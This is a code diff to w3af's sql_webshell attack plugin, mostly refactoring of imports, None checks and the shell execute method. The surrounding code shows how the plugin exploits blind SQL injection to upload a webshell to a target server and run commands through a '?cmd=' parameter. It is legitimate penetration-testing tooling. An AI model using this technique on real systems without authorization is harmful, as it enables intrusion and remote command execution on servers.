@@ -37,11 +37,13 @@ import core.data.kb.knowledgeBase as kb
 import core.data.kb.vuln as vuln
 from core.data.kb.shell import shell as shell
 
-import plugins.attack.payloads.payloads as payloads
+import plugins.attack.payloads.shell_handler as shell_handler
+from plugins.attack.payloads.decorators.exec_decorator import exec_debug
 
 # options
 from core.data.options.option import option
 from core.data.options.optionList import optionList
+
 
 import urllib
 
@@ -77,7 +79,7 @@ class sql_webshell(baseAttackPlugin):
         '''
         om.out.debug( 'Starting sql_webshell fastExploit.' )
         
-        if self._url == None or self._method == None or self._data == None or self._injvar == None:
+        if self._url is None or self._method is None or self._data is None or self._injvar is None:
             raise w3afException('You have to configure the plugin parameters')
         else:
             
@@ -109,7 +111,7 @@ class sql_webshell(baseAttackPlugin):
                 msg += '. Please wait...'
                 om.out.console( msg )
                 shell_obj = self._generateShell( vuln_obj )
-                if shell_obj != None:
+                if shell_obj is not None:
                     kb.kb.append( self, 'shell', shell_obj )
                     return [shell_obj, ]
                     
@@ -134,7 +136,7 @@ class sql_webshell(baseAttackPlugin):
         '''
         vulns = self.getExploitableVulns()
 
-        if vulnToExploit != None:
+        if vulnToExploit is not None:
             vulns = [ v for v in vulns if v.getId() == vulnToExploit ]
             
         if len(vulns) != 0:
@@ -150,7 +152,7 @@ class sql_webshell(baseAttackPlugin):
         '''
         Exploits a [blind] sql injections vulns that was found and stored in the kb.
 
-        @return: True if the shell is working and the user can start calling rexec
+        @return: True if the shell is working and the user can start calling specific_user_input
         '''
         if not self.canExploit():
             return []
@@ -167,7 +169,7 @@ class sql_webshell(baseAttackPlugin):
             for v in vulns:
             
                 # Filter the vuln that was selected by the user
-                if vulnToExploit != None:
+                if vulnToExploit is not None:
                     if vulnToExploit != v.getId():
                         continue
             
@@ -214,7 +216,7 @@ class sql_webshell(baseAttackPlugin):
             
         dbBuilder = dbDriverBuilder( self._urlOpener, bsql.equal )
         driver = dbBuilder.getDriverForVuln( vuln_obj )
-        if driver == None:
+        if driver is None:
             return None
         else:
             # We have a driver, now, using this driver, we have to create the webshell in the
@@ -223,14 +225,14 @@ class sql_webshell(baseAttackPlugin):
             if webshell_url:
                 # Define the corresponding cut...
                 response = self._urlOpener.GET( webshell_url )
-                self._defineCut( response.getBody(), payloads.SHELL_IDENTIFIER , exact=True )
+                self._define_exact_cut( response.getBody(), shell_handler.SHELL_IDENTIFIER )
                 
                 # Create the shell object
                 # Set shell parameters
                 shell_obj = sql_web_shell( vuln_obj )
                 shell_obj.setUrlOpener( self._urlOpener )
                 shell_obj.setWebShellURL( webshell_url )
-                shell_obj.setCut( self._header, self._footer )
+                shell_obj.set_cut( self._header_length, self._footer_length )
                 kb.kb.append( self, 'shell', shell_obj )
                 return shell_obj
             else:
@@ -290,7 +292,7 @@ class sql_webshell(baseAttackPlugin):
             # Get the extension from the vulnerable script
             extension = urlParser.getExtension( vuln_obj.getURL() )
             
-            for file_content, real_extension in payloads.get_webshells( extension ):
+            for file_content, real_extension in shell_handler.get_webshells( extension ):
                 
                 # Create the variables to upload the file, based on the success of the
                 # previous for loop:
@@ -303,7 +305,7 @@ class sql_webshell(baseAttackPlugin):
                 test_url += '/' + filename + '.' + real_extension + '?cmd='
                 
                 # Upload & test
-                if self._upload_file( driver, remote_path, file_content, test_url, payloads.SHELL_IDENTIFIER):
+                if self._upload_file( driver, remote_path, file_content, test_url, shell_handler.SHELL_IDENTIFIER):
                     # Complete success!
                     om.out.console('Successfully installed a webshell in the target server!')
                     return test_url
@@ -459,13 +461,16 @@ class sql_web_shell(shell):
     
     def getWebShellURL( self ):
         return self._webshell_url
-        
-    def _rexec( self, command ):
+    
+    @exec_debug
+    def execute( self, command ):
         '''
-        This method is called when a command is being sent to the remote server.
-        This is a NON-interactive shell.
+        This method is called when a user writes a command in the shell and hits enter.
+        
+        Before calling this method, the framework calls the generic_user_input method
+        from the shell class.
 
-        @parameter command: The command to send ( ie. "ls", "whoami", etc ).
+        @parameter command: The command to handle ( ie. "read", "exec", etc ).
         @return: The result of the command.
         '''
         to_send = self.getWebShellURL() + urllib.quote_plus( command )
